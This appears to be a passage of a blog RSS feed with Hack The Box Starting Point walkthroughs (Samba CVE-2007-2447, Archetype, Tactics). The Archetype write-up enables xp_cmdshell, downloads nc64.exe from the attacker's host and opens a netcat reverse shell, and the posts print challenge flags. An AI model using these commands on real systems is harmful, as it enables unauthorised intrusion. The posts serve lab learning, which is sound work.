<h4 id="what-2007-cve-allows-for-remote-code-execution-in-this-version-of-samba-via-shell-metacharacters-involving-the-samrchangepassword-function-when-the-username-map-script-option-is-enabled-in-smbconf">What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the <code>SamrChangePassword</code> function when the &ldquo;username map script&rdquo; option is enabled in <code>smb.conf</code>?</h4>






<pre tabindex="0"><code>CVE-2007-2447</code></pre>
<p><img src="image-10.png#center" alt="alt text"></p>
<br>
<h4 id="exploiting-cve-2007-2447-returns-a-shell-as-which-user">Exploiting CVE-2007-2447 returns a shell as which user?</h4>






<pre tabindex="0"><code>root</code></pre>
<p><img src="image-11.png#center" alt="alt text"></p>
<p><img src="image-12.png#center" alt="alt text"></p>
<p><img src="image-13.png#center" alt="alt text"></p>
<br>
<h4 id="submit-the-flag-located-in-the-makis-users-home-directory">Submit the flag located in the makis user&rsquo;s home directory.</h4>






<pre tabindex="0"><code>063d439bcae7f5e0ab82493bd8035243</code></pre>
<p><img src="image-14.png#center" alt="alt text"></p>
<br>
<h4 id="submit-the-flag-located-in-roots-home-directory">Submit the flag located in root&rsquo;s home directory.</h4>






<pre tabindex="0"><code>910d82f873622fdf9e5abb95ba010832</code></pre>
<p><img src="image-15.png#center" alt="alt text"></p>
<br>
<p><img src="image-16.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Archetype</title>
      <link>http://localhost:1313/htb-archetype/</link>
      <pubDate>Sat, 27 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-archetype/</guid>
      <description>This was the first box in Tier 2 of the Starting Point. However, I am pretty sure these boxes are not starter boxes because this one was super hard and I honestly would have not finished it without the walkthrough. Since I couldn&amp;rsquo;t finish this box myself, there are going to be some missing points here and there throughout this post. I think it&amp;rsquo;s time for me to start working on the easy boxes from here and maybe come back to the tier 2 boxes later after some time.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img src="./giphy.gif"></div>
<p>This was the first box in <code>Tier 2</code> of the Starting Point. However, I am pretty sure these boxes are not starter boxes because this one was super hard and I honestly would have not finished it without the walkthrough. Since I couldn&rsquo;t finish this box myself, there are going to be some missing points here and there throughout this post. I think it&rsquo;s time for me to start working on the easy boxes from here and maybe come back to the tier 2 boxes later after some time. If I can solve one of those in the future, I will be happy to death and feel so much pride in myself. I believe the day will come very soon.</p>
<hr>
<h4 id="which-tcp-port-is-hosting-a-databse-server">Which TCP port is hosting a databse server?</h4>






<pre tabindex="0"><code>1433</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-name-of-the-non-administrative-share-available-over-smb">What is the name of the non-Administrative share available over SMB?</h4>






<pre tabindex="0"><code>backups</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<p>What is the password identified in the file on the SMB share?</p>






<pre tabindex="0"><code>M3g4c0rp123</code></pre>
<p>After I figured there was a non-administrative share called backups, I tried to connect to the share by running the following command:</p>
<p><code>smblcient -N \\\\10.129.95.187\\backups</code></p>
<p>The <code>-N</code> option is short for &lsquo;No Password&rsquo;</p>
<p><img src="image-2.png#center" alt="alt text"></p>
<p>On the left tmux pane, I was able to connect to the <code>backups</code> share of the SMB server and download the only file <code>prod.dtsConfig</code> using the <code>get</code> command. On the right tmux pane, I opened up the downloaded file and was able to find the password inside.</p>
<br>
<h4 id="what-script-from-impacket-collection-can-be-used-in-order-to-establish-an-authenticated-connection-to-a-microsoft-sql-server">What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</h4>






<pre tabindex="0"><code>mssqlclient.py</code></pre>
<p><img src="image-3.png#center" alt="alt text"></p>
<p><strong><em>But What is Impacket?</em></strong></p>
<p>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.</p>
<br>
<p>We can try to connect to the MSSQL server by using impacket&rsquo;s <code>mssqlclient.py</code> script along with the following flags:
<code>python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth</code></p>
<p><code>-windows-auth</code>: this flag is specified to use Windows Authentication</p>
<p>Successfully authenticated to the Microsoft SQL Server</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/impacket/examples<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Impacket v0.12.0.dev1+20240725.125704.9f36a10e - Copyright <span style="color:#fab387">2023</span> Fortra
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Encryption required, switching to TLS
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> ENVCHANGE<span style="color:#89dceb;font-weight:bold">(</span>DATABASE<span style="color:#89dceb;font-weight:bold">)</span>: Old Value: master, New Value: master
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> ENVCHANGE<span style="color:#89dceb;font-weight:bold">(</span>LANGUAGE<span style="color:#89dceb;font-weight:bold">)</span>: Old Value: , New Value: us_english
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> ENVCHANGE<span style="color:#89dceb;font-weight:bold">(</span>PACKETSIZE<span style="color:#89dceb;font-weight:bold">)</span>: Old Value: 4096, New Value: <span style="color:#fab387">16192</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> INFO<span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89dceb;font-weight:bold">)</span>: Line 1: Changed database context to <span style="color:#a6e3a1">&#39;master&#39;</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> INFO<span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89dceb;font-weight:bold">)</span>: Line 1: Changed language setting to us_english.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> ACK: Result: <span style="color:#fab387">1</span> - Microsoft SQL Server <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">140</span> 3232<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>!<span style="color:#89dceb;font-weight:bold">]</span> Press <span style="color:#89dceb">help</span> <span style="color:#cba6f7">for</span> extra shell commands
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt;</span></span></code></pre></div>
<br>
<h4 id="what-extended-stored-procedure-of-microsoft-sql-server-can-be-used-in-order-to-spawn-a-windows-command-shell">What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</h4>






<pre tabindex="0"><code>xp_cmdshell</code></pre>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="what-script-can-be-used-in-order-to-search-possible-paths-to-escalate-privileges-on-windows-hosts">What script can be used in order to search possible paths to escalate privileges on Windows hosts?</h4>






<pre tabindex="0"><code>winPEAS</code></pre>
<p>The cheatsheet from pentestmonkey is really helpful that I found how to set up the command execution through the <code>xp_cmdshell</code>.
<img src="image-5.png#center" alt="alt text"></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; EXEC xp_cmdshell <span style="color:#a6e3a1">&#39;net user&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>ERROR: Line 1: SQL Server blocked access to procedure <span style="color:#a6e3a1">&#39;sys.xp_cmdshell&#39;</span> of component <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span> because this component is turned off as part of the secur
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>ity configuration <span style="color:#cba6f7">for</span> this server. A system administrator can <span style="color:#89dceb">enable</span> the use of <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span> by using sp_configure. For more information about enabling <span style="color:#a6e3a1">&#39;xp
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#a6e3a1">_cmdshell&#39;</span>, search <span style="color:#cba6f7">for</span> <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span> in SQL Server Books Online.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; EXEC sp_configure <span style="color:#a6e3a1">&#39;show advanced options&#39;</span>, 1;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> INFO<span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89dceb;font-weight:bold">)</span>: Line 185: Configuration option <span style="color:#a6e3a1">&#39;show advanced options&#39;</span> changed from <span style="color:#fab387">0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; RECONFIGURE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; EXEC sp_configure <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span>, 1;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> INFO<span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89dceb;font-weight:bold">)</span>: Line 185: Configuration option <span style="color:#a6e3a1">&#39;xp_cmdshell&#39;</span> changed from <span style="color:#fab387">0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; RECONFIGURE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; sp_configure;</span></span></code></pre></div>
<p>Now I managed to get a command execution. Let&rsquo;s get a stable reverse shell. We will upload the <code>nc64.exe</code> binary to the target machine and execute an interactive <code>cmd.exe</code> process on our listening port.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>SQL <span style="color:#89dceb;font-weight:bold">(</span>ARCHETYPE<span style="color:#89b4fa">\s</span>ql_svc  dbo@master<span style="color:#89dceb;font-weight:bold">)</span>&gt; xp_cmdshell <span style="color:#a6e3a1">&#34;whoami&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>output
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>-----------------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>archetype<span style="color:#89b4fa">\s</span>ql_svc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>NULL</span></span></code></pre></div>
<p>Let&rsquo;s download the binary and navigate to the oflder and then start the simple HTTP sever, then the netcat listener in a different tab.</p>
<p><code>python3 -m http.server 80</code>
<code>nc -lvnp 443</code></p>
<br>
<p>As a user <code>archetype\sql_svc</code>, we don&rsquo;t have enough privileges to upload files in a system directory and only user <code>Administrator</code> can perform actions with higher privileges. We need to change the current working directory somewhere in the home directory of our user where it will be possible to write.</p>
<p><code>SQL&gt; xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.14/nc64.exe -outfile nc64.exe</code></p>
<p><img src="image-6.png#center" alt="alt text"></p>
<p>it was confirmed that the target machine indeed performed the request. Let&rsquo;s bind the <code>cmd.exe</code> through the <code>nc</code> to our listener.</p>
<p><code>SQL&gt; xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.14 443&quot;</code></p>
<p><img src="image-7.png#center" alt="alt text"></p>
<p>on the right tmux pane, I was able to capture the reverse shell through the netcat.</p>
<br>
<h4 id="what-file-contains-the-administrators-password">What file contains the administrator&rsquo;s password?</h4>






<pre tabindex="0"><code>ConsoleHost_history.txt</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span> Directory of C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\s</span>ql_svc<span style="color:#89b4fa">\D</span>esktop
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>01/20/2020  06:42 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>01/20/2020  06:42 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>02/25/2020  07:37 AM                <span style="color:#fab387">32</span> user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>               <span style="color:#fab387">1</span> File<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>             <span style="color:#fab387">32</span> bytes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>               <span style="color:#fab387">2</span> Dir<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>  10,716,418,048 bytes free
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\s</span>ql_svc<span style="color:#89b4fa">\D</span>esktop&gt;type user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb">type</span> user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>3e7b102e78218e935bf3f4951fec21a3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\s</span>ql_svc<span style="color:#89b4fa">\D</span>esktop&gt;</span></span></code></pre></div>
<p>On the target machine, I used powershell to download the program from my system.
<img src="image-8.png#center" alt="alt text"></p>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
<h4 id="submit-user-flag">Submit user flag</h4>






<pre tabindex="0"><code>3e7b102e78218e935bf3f4951fec21a3</code></pre>
<p><img src="image-10.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>b91ccec3305e98240082d4474b848528</code></pre>
<br>
<p><img src="image-11.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Tactics</title>
      <link>http://localhost:1313/htb-tactics/</link>
      <pubDate>Fri, 26 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-tactics/</guid>
      <description>Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall? -Pn By default, when nmap performs host discovery, it
sends an ICMP ping. checks if port 80 is open checks if port 443 is open. If any of these three conditions are met, nmap considers the host to be up.
However, in many real-world scenarios, ICMP is often blocked, and ports 80 and 443 are closed.</description>
      <content:encoded><![CDATA[<h4 id="which-nmap-switch-can-we-use-to-enumerate-machines-when-our-ping-icmp-packets-are-blocked-by-the-windows-firewall">Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?</h4>






<pre tabindex="0"><code>-Pn</code></pre>
<p>By default, when nmap performs host discovery, it</p>
<ul>
<li>sends an ICMP ping.</li>
<li>checks if port 80 is open</li>
<li>checks if port 443 is open.</li>
</ul>
<p>If any of these three conditions are met, nmap considers the host to be up.</p>
<p>However, in many real-world scenarios, ICMP is often blocked, and ports 80 and 443 are closed. In such cases, nmap may incorrectly assume the host is dead and not proceed with port scanning.</p>
<p>To address this issue, you can use the <code>-Pn</code> switch to skip the host discovery process.</p>
<br>
<h4 id="what-does-the-3-letter-acronym-smb-stand-for">What does the 3-letter acronym SMB stand for?</h4>






<pre tabindex="0"><code>Server Message Block</code></pre>
<br>
<h4 id="what-port-does-smb-use-to-operate-at">What port does SMB use to operate at?</h4>






<pre tabindex="0"><code>445</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="what-command-line-argument-do-you-give-to-smbclient-to-list-available-shares">What command line argument do you give to <code>smbclient</code> to list available shares?</h4>






<pre tabindex="0"><code>-L</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="what-character-at-the-end-of-a-share-name-indicates-its-an-administrative-share">What character at the end of a share name indicates it&rsquo;s an administrative share?</h4>






<pre tabindex="0"><code>$</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<p><code>$</code> indicates it&rsquo;s an administrative share.
<code>-U</code> switch for Login identity. <strong><em>Administrator</em></strong> is the high privilege standard account for Windows operating system.</p>
<br>
<h4 id="which-administrative-share-is-accessible-on-the-box-that-allows-users-to-view-the-whole-file-system">Which Administrative share is accessible on the box that allows users to view the whole file system?</h4>






<pre tabindex="0"><code>C$</code></pre>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<h4 id="what-command-can-we-use-to-download-the-files-we-find-on-the-smb-share">What command can we use to download the files we find on the SMB Share?</h4>






<pre tabindex="0"><code>get</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>smb: <span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\A</span>dministrator<span style="color:#89b4fa">\&gt;</span> <span style="color:#89dceb">cd</span> Desktop<span style="color:#89b4fa">\
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#89b4fa"></span>smb: <span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\A</span>dministrator<span style="color:#89b4fa">\D</span>esktop<span style="color:#89b4fa">\&gt;</span> ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>  .                                  DR        <span style="color:#fab387">0</span>  Thu Apr <span style="color:#fab387">22</span> 03:16:03 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>  ..                                 DR        <span style="color:#fab387">0</span>  Thu Apr <span style="color:#fab387">22</span> 03:16:03 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>  desktop.ini                       AHS      <span style="color:#fab387">282</span>  Wed Apr <span style="color:#fab387">21</span> 11:23:32 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>  flag.txt                            A       <span style="color:#fab387">32</span>  Fri Apr <span style="color:#fab387">23</span> 05:39:00 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>                <span style="color:#fab387">3774463</span> blocks of size 4096. <span style="color:#fab387">1158389</span> blocks available
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>smb: <span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\A</span>dministrator<span style="color:#89b4fa">\D</span>esktop<span style="color:#89b4fa">\&gt;</span> get flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>getting file <span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\A</span>dministrator<span style="color:#89b4fa">\D</span>esktop<span style="color:#89b4fa">\f</span>lag.txt of size <span style="color:#fab387">32</span> as flag.txt <span style="color:#89dceb;font-weight:bold">(</span>0.2 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">(</span>average 0.2 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span></span></span></code></pre></div>
<br>
<h4 id="which-tool-that-is-part-of-the-impacket-collection-can-be-used-to-get-an-interactive-shell-on-the-system">Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?</h4>






<pre tabindex="0"><code>psexec.py</code></pre>
<p>Since we can access this <code>ADMIN$</code> share, we can try to use a tool called <code>psexec.py</code> to exploit this misconfiguration &amp; get the interactive system shell. The <code>psexec.py</code> is part of the Impacket framework.</p>
<p><strong><em>Impacket</em></strong> is a framework written in Python for working with network protocols. It is focused on providing low-level programmatic access to the packets and for some protocols. In short, Impacket contains dozens of amazing tools for interacting with Windows systems and applications, many of which are ideal for attacking Windows and Active Directory.</p>
<p>One of the most commonly used tools in Impacket is <code>psexec.py</code>. It is named after the utility, PsExec from Microsoft&rsquo;s Sysinternals suite since it performs the same function of enabling us to execute a fully interactive shell on remote Windows machines.</p>
<p><strong><em>How Impacket&rsquo;s psexec works</em></strong>
Impacket creates a remote service by uploading a randomly-named executable on the <code>ADMIN$</code> share on the remote system and then register it as a Windows service. This will result in having an interactive shell available on the remote Windows system via TCP port 445.</p>
<p>Psexec requires credentials for a user with local administrator privileges or higher since reading/writing to the <code>ADMIN$</code> share is required. Once you successfully authenticate, it will drop you int a <code>NT Authority\System</code> shell.</p>
<p>installation guide</p>






<pre tabindex="0"><code>git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt</code></pre>
<p>The syntax for simply getting an interactive shell from a target:</p>
<p><code>python psexec.py username:password@hostIP</code></p>
<p>We know that there is no password for the <code>Administrator</code> user. So, the command we are going to run is:</p>
